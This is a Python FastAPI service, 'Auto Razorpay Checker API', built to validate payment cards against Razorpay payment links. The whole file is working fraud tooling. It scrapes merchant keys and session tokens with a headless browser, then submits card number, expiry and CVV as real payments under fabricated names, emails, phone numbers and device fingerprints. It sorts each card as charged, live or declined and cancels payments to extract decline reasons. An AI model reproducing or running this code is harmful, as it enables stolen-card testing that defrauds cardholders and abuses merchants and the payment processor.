# app.py - Auto Razorpay Checker API for Railway
# API endpoint: /hit?site=<url>&amount=<rupees>&cc=<card|mm|yy|cvv>
# Developer: @stormyt10k

import asyncio
import json
import random
import re
import string
import time
from datetime import datetime
from urllib.parse import urlparse, parse_qs

import requests
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from playwright.async_api import async_playwright, Browser, Playwright

# ----------------------------------------------------------------------
# Configuration
MAX_TOKEN_USES = 15          # Refresh session token after this many uses
MERCHANT_CACHE_TTL = 3600    # Cache merchant data for 1 hour
MAX_CONCURRENT_PAGES = 10    # Limit concurrent Playwright page operations

# Global browser instance and caches
playwright_instance: Playwright = None
browser: Browser = None
merchant_cache = {}           # key: site_url -> (data, timestamp)
token_cache = {}              # key: "global" -> (token, use_count)

# Semaphore to limit concurrent Playwright page creations
page_semaphore = asyncio.Semaphore(MAX_CONCURRENT_PAGES)

# ----------------------------------------------------------------------
# Helper functions
def generate_device_fingerprint():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(128))

DEVICE_FINGERPRINT = generate_device_fingerprint()

def random_user_info():
    return {
        "name": "Test User",
        "email": f"testuser{random.randint(100, 999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }

# ----------------------------------------------------------------------
# Playwright-based operations (async, using global browser)
async def extract_merchant_data(site_url: str):
    """Extract keyless_header, key_id, payment_link_id, payment_page_item_id from site URL."""
    async with page_semaphore:
        context = await browser.new_context()
        page = await context.new_page()
        try:
            await page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            intercepted = {}

            async def on_response(response):
                if "api.razorpay.com/v1/payment_links/merchant" in response.url:
                    try:
                        intercepted['data'] = await response.json()
                    except:
                        pass

            page.on("response", on_response)
            await page.goto(site_url, timeout=45000, wait_until='networkidle')
            await page.wait_for_timeout(3000)

            eval_data = await page.evaluate("""() => {
                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
                if (d && d.keyless_header) return d;
                for (let k in window) {
                    try {
                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
                    } catch(e) {}
                }
                const scripts = document.querySelectorAll('script');
                for (let s of scripts) {
                    const txt = s.textContent || s.innerText;
                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                        if (matches) {
                            for (let match of matches) {
                                try {
                                    const parsed = JSON.parse(match);
                                    if (parsed.keyless_header || parsed.key_id) return parsed;
                                } catch (e) {}
                            }
                        }
                    }
                }
                return null;
            }""")

            final = eval_data or intercepted.get('data')
            if final:
                kh = final.get('keyless_header')
                kid = final.get('key_id')
                pl = final.get('payment_link') or final
                if isinstance(pl, str):
                    try:
                        pl = json.loads(pl)
                    except:
                        pass
                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')
                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi, None

            # Fallback: try API directly
            merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
            if merchant_match:
                merchant_handle = merchant_match.group(1)
                api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
                response = requests.get(api_url, timeout=10)
                if response.status_code == 200:
                    api_data = response.json()
                    kh = api_data.get('keyless_header')
                    kid = api_data.get('key_id')
                    plid = api_data.get('id')
                    ppi = api_data.get('payment_page_items', [{}])[0].get('id')
                    if kh and kid and plid and ppi:
                        return kh, kid, plid, ppi, None

            return None, None, None, None, "Extraction failed."
        except Exception as e:
            return None, None, None, None, f"Extraction error: {str(e)[:100]}"
        finally:
            await context.close()

async def get_dynamic_session_token():
    """Get a fresh Razorpay session token."""
    async with page_semaphore:
        context = await browser.new_context()
        page = await context.new_page()
        try:
            await page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            await page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            await page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            return token, None if token else "Token not found"
        except Exception as e:
            return None, f"Session token error: {str(e)[:100]}"
        finally:
            await context.close()

# ----------------------------------------------------------------------
# Core card processing (synchronous, uses requests)
def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    payload = {"notes": {"comment": ""}, "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except:
        return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {"key_id": key_id, "session_token": session_token, "keyless_header": keyless_header}
    headers = {"x-session-token": session_token, "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
    data = {
        "notes[comment]": "", "payment_link_id": payment_link_id, "key_id": key_id, "contact": f"+91{user_info['phone']}",
        "email": user_info["email"], "currency": "INR", "_[library]": "checkoutjs", "_[platform]": "browser",
        "_[referer]": site_url, "amount": amount_paise, "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT, "method": "card", "card[number]": card_number,
        "card[cvv]": cvv, "card[name]": user_info["name"], "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year, "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=requests.compat.urlencode(data), timeout=20)

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'x-session-token': session_token, 'User-Agent': 'Mozilla/5.0'}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}', params=params, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
    except Exception as e:
        return 'unknown', {'error': f'Status check error: {e}'}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'x-session-token': session_token, 'User-Agent': 'Mozilla/5.0'}
    params = {'key_id': key_id, 'session_token': session_token, 'keyless_header': keyless_header}
    try:
        r = requests.get(f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel', params=params, headers=headers, timeout=15)
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
    except Exception as e:
        return {"error": {"description": f"Cancel request error: {e}"}}

def parse_decline_reason(cancel_data):
    if isinstance(cancel_data, dict) and "error" in cancel_data:
        err = cancel_data["error"]
        if isinstance(err, dict):
            desc = err.get('description', 'Declined').replace("%s", "Card")
            reason = err.get('reason', '')
            code = err.get('code', '')
            parts = [desc]
            if reason and reason != 'unknown':
                parts.append(f"Reason: {reason}")
            if code and code != 'N/A':
                parts.append(f"Code: {code}")
            return " | ".join(parts)
        return str(err)
    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"

def process_card_sync(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise):
    start = time.time()
    try:
        num, mm, yy, cvv = cc_line.strip().split('|')
    except ValueError:
        return "SKIP", "Invalid format (need card|mm|yy|cvv)", 0, {}

    session = requests.Session()
    order_id = create_order(session, plid, amount_paise, ppiid)
    if not order_id:
        return "FAIL", "Order creation failed", round(time.time() - start, 2), {}

    time.sleep(random.uniform(1, 2))
    try:
        user_info = random_user_info()
        response = submit_payment(session, order_id, (num, mm, yy, cvv), user_info, amount_paise, kid, kh, plid, stoken, site_url)
        pdata = response.json()
    except Exception as e:
        return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time() - start, 2), {}

    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if not pid and isinstance(pdata.get("payment"), dict):
        pid = pdata["payment"].get("id")

    # Handle redirect (3DS)
    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        if pid:
            time.sleep(3)
            stat, sdata = check_payment_status(pid, kid, stoken, kh)
            if stat in ['captured', 'authorized']:
                return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time() - start, 2), pdata
            if stat == 'failed':
                reason = "Payment failed"
                if isinstance(sdata, dict):
                    err = sdata.get('error_description') or sdata.get('error', {}).get('description', '')
                    if err:
                        reason = err
                return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
            if stat == 'created':
                return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time() - start, 2), pdata
            # Cancel to get decline reason
            cdata = cancel_payment(pid, kid, stoken, kh)
            if isinstance(cdata, dict) and "error" in cdata:
                err = cdata["error"]
                if isinstance(err, dict) and err.get('reason') == 'payment_cancelled':
                    return "LIVE", f"ID: {pid} | 3DS/OTP Required", round(time.time() - start, 2), pdata
            reason = parse_decline_reason(cdata)
            return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
        return "FAIL", "3DS redirect missing PID", round(time.time() - start, 2), pdata

    # Immediate result
    if "razorpay_signature" in pdata or "signature" in pdata:
        return "CHARGED", f"ID: {pid} | Immediate success", round(time.time() - start, 2), pdata

    if "error" in pdata:
        err = pdata.get('error', {})
        if isinstance(err, dict):
            desc = err.get('description', 'Unknown error').replace("%s", "Card")
            code = err.get('code', 'N/A')
            reason = err.get('reason', '')
            msg = f"{desc} (Code: {code})"
            if reason:
                msg += f" [Reason: {reason}]"
            if pid:
                msg = f"ID: {pid} | {msg}"
            return "DECLINED", msg, round(time.time() - start, 2), pdata
        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time() - start, 2), pdata

    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time() - start, 2), pdata

# ----------------------------------------------------------------------
# FastAPI app
app = FastAPI(title="Auto Razorpay Checker API", description="Check credit cards against Razorpay payment links")

@app.on_event("startup")
async def startup():
    global playwright_instance, browser
    playwright_instance = await async_playwright().start()
    browser = await playwright_instance.chromium.launch(
        headless=True,
        args=['--no-sandbox', '--disable-dev-shm-usage']
    )

@app.on_event("shutdown")
async def shutdown():
    if browser:
        await browser.close()
    if playwright_instance:
        await playwright_instance.stop()

def get_cached_merchant_data(site_url: str):
    now = time.time()
    if site_url in merchant_cache:
        data, ts = merchant_cache[site_url]
        if now - ts < MERCHANT_CACHE_TTL:
            return data
    return None

def set_cached_merchant_data(site_url: str, data):
    merchant_cache[site_url] = (data, time.time())

def get_cached_token():
    if "global" in token_cache:
        token, count = token_cache["global"]
        if count < MAX_TOKEN_USES:
            return token, count
    return None, 0

def update_cached_token(token, use_count):
    token_cache["global"] = (token, use_count)

async def ensure_merchant_data(site_url: str):
    cached = get_cached_merchant_data(site_url)
    if cached:
        return cached
    kh, kid, plid, ppiid, err = await extract_merchant_data(site_url)
    if err:
        raise HTTPException(status_code=400, detail=f"Merchant extraction failed: {err}")
    data = {"kh": kh, "kid": kid, "plid": plid, "ppiid": ppiid}
    set_cached_merchant_data(site_url, data)
    return data

async def ensure_session_token():
    token, count = get_cached_token()
    if token:
        return token, count
    token, err = await get_dynamic_session_token()
    if err:
        raise HTTPException(status_code=500, detail=f"Session token error: {err}")
    update_cached_token(token, 0)
    return token, 0

@app.get("/hit")
async def hit_endpoint(
    site: str = Query(..., description="Razorpay site URL (e.g., https://razorpay.me/@store)"),
    amount: int = Query(1, ge=1, description="Amount in Rupees"),
    cc: str = Query(..., description="Card details in format: card|mm|yy|cvv")
):
    # Validate cc format
    if '|' not in cc:
        raise HTTPException(status_code=400, detail="Invalid CC format. Use: card|mm|yy|cvv")

    amount_paise = amount * 100

    # Get merchant data (cached)
    merchant = await ensure_merchant_data(site)

    # Get session token (with use counter)
    stoken, use_count = await ensure_session_token()

    # Increment token use count after using it
    new_use_count = use_count + 1
    if new_use_count >= MAX_TOKEN_USES:
        # Token expired, will get new one next time
        update_cached_token(stoken, MAX_TOKEN_USES)  # mark as expired
    else:
        update_cached_token(stoken, new_use_count)

    # Run card processing in thread pool (blocking)
    result = await asyncio.to_thread(
        process_card_sync,
        cc, merchant["plid"], merchant["ppiid"], merchant["kid"],
        merchant["kh"], stoken, site, amount_paise
    )
    tag, msg, elapsed, details = result

    response = {
        "status": tag,
        "message": msg,
        "time_seconds": elapsed,
        "developer": "@stormyt10k",
        "details": details
    }
    return JSONResponse(content=response)

@app.get("/health")
async def health():
    return {"status": "ok", "developer": "@stormyt10k"}